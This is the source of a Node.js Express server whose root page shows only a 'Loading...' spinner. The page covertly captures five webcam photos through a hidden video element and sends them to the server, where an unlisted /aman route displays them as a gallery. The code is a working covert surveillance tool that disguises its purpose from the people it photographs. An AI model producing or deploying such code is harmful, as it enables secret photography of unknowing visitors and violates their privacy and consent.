import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Memory storage for photos (base64)
let capturedPhotos = [];

// Serve root page → auto photo capture + spinner
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <style>
        body {
          margin: 0; display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh; background: #000;
        }
        .spinner {
          border: 8px solid rgba(255,255,255,0.2);
          border-top: 8px solid cyan;
          border-radius: 50%;
          width: 80px; height: 80px;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg);}
          100% { transform: rotate(360deg);}
        }
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <video id="video" autoplay playsinline style="display:none"></video>
      <canvas id="canvas" style="display:none"></canvas>
      <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let photos = [];

        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            let count = 0;
            let interval = setInterval(() => {
              if (count >= 5) {
                clearInterval(interval);
                stream.getTracks().forEach(track => track.stop());
                fetch('/save', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ photos })
                });
              } else {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/png'));
                count++;
              }
            }, 1000);
          });
      </script>
    </body>
    </html>
  `);
});

// API to save photos
app.use(express.json({ limit: "10mb" }));
app.post("/save", (req, res) => {
  capturedPhotos = req.body.photos || [];
  res.json({ status: "saved", count: capturedPhotos.length });
});

// /aman → show gallery
app.get("/aman", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Gallery</title>
      <style>
        body { background:#111; color:#fff; display:flex; flex-wrap:wrap; justify-content:center; }
        img { margin:10px; border-radius:10px; box-shadow:0 0 15px rgba(0,255,255,0.7); max-width:300px; }
      </style>
    </head>
    <body>
      ${capturedPhotos.map(p => `<img src="\${p}"/>`).join("")}
    </body>
    </html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port " + PORT));
